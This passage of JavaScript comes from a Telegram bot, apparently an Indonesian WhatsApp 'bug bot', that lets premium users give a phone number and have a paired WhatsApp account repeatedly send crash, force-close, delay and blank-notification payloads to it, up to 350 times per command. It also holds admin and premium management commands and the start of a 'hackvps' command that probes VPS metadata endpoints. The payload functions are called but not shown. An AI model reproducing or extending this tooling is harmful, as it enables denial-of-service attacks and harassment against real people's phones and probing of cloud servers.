        "⚡ **MULTI BUG IN PROGRESS**\n\n" +
        `🎯 Target        : ${target.replace("@s.whatsapp.net", "")}\n` +
        `📌 Urutan        : ${current} / ${totalTarget}\n` +
        `📊 Progress      : ${percent}%\n` +
        `✅ Status        : Target selesai`
      );

      await sleep(1500);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      progressMsg.message_id,
      null,
      "✅ **MULTI BUG COMPLETED**\n\n" +
      `🎯 Total Target : ${totalTarget}\n` +
      `📊 Progress     : 100%\n` +
      `🔥 Status       : All target processed`
  );
});
bot.command("protocol11", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /protocol11 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /protocol11
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXBulldo(sock, target);  
      await sleep(1000);
    }
  })();
});

bot.command("bulldozer", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /bulldozer 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /bulldozer
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXBulldo(sock, target);  
      await sleep(1000);
    }
  })();
});

bot.command("xdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xdelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayHardSwVnX(sock, target, mention = true);  
      await sleep(1000);
    }
  })();
});
bot.command("uiloca", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uiloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /uiloca
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await OneTapLoca(sock, target);  
      await sleep(1000);
    }
  })();
});

bot.command("xspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xspam
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisSpam(sock, target);      
      await sleep(1500);
    }
  })();
});
bot.command("xdelayv2", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

   

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xinvis 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xinvis
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayHardSwVnX(sock, target, mention = true);      
      await sleep(1000);
    }
  })();
});
bot.command("xipongdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    i
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongdelay
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayIos(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("xfcxspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xfcxspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xfcxspam
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 1; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await ForceCloseInvisible(sock, target);      
      await sleep(1000);
    }
  })();
});

bot.command("hoytc", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hoytc 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hoytc
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 45; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await FcButtons(sock, target);      
      await sleep(1000);
    }
  })();
});

bot.command("xipongui", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongui
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await VnXDeck(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("xipongforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xipongforce 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /xipongforce
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 100; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await NewlasterFollCrashIos(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("hoycristal", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hoycristal 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜𝐩͡𝐞͢𝐫͜ 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hoycristal
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 350; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await FcHardFix(sock, target, ptcp = true);
      await sleep(1500);
    }
  })();
});
bot.command("DelayInvisSpam", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    

//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /DelayInvisSpam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix In𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /DelayInvisSpam
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await DelayInvisSpam(sock, target);
      await sleep(15000);
    }
  })();
});
bot.command("blankNotif", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankNotif 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blankNotif
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await BlankNotiffButton(sock, target);      
      await sleep(1000);
    }
  })();
});
bot.command("blank1msg", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blank1msg 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blank1msg
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 2; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await BlankOneMsg(sock, target);
      await sleep(250);
    }
  })();
});
bot.command("locaButton", checkWhatsAppConnection, checkPremium, async (ctx) => {
//////// -- START CASE OTP SECURITY --- \\\\\\\\\\\
     const chatId = ctx.chat.id;

  if (!verifiedUsers.has(chatId)) {
    return ctx.reply(
      "🔒 Access locked. Enter the Password using the command: /password <The Password>"
    );
  }

    

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
//////// -- END CASE OTP SECURITY --- \\\\\\\\\\\
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /locaButton 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/zrhmp1.jpg", {
    caption: `
<blockquote>交 𝐕͢𝐢͜onix 𝐈͢𝐧͜𝐯͡𝐢͢𝐜͜𝐭͡𝐮͢𝐬  交</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /locaButton
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    }, 
  });

  (async () => {
    for (let i = 0; i < 2; i++) {
      console.log(chalk.red(`Send Bug ??${i + 1} To ${q}`));
      await LocaUrlButton(sock, target, Ptcp = true);
      await sleep(2500);
    }
  })();
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 8509166320"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 8509166320"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "SENNGNTG");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "𝗛𝗮𝗽𝘂𝘀", callback_data: "Close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.command("Close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("❌ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsender", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
////////// OWNER MENU \\\\\\\\\
bot.command("status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////END/////////////////////////
bot.command('hackvps', async (ctx) => {

    await ctx.reply("🔍 Memulai pemindaian metadata VPS... Mohon tunggu.");

    // Helper fetch sesuai struktur asli
    const tryFetch = async (url, headers = {}) => {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 2000); // Timeout 2 detik
        try {
            const res = await fetch(url, { headers, signal: ctrl.signal });
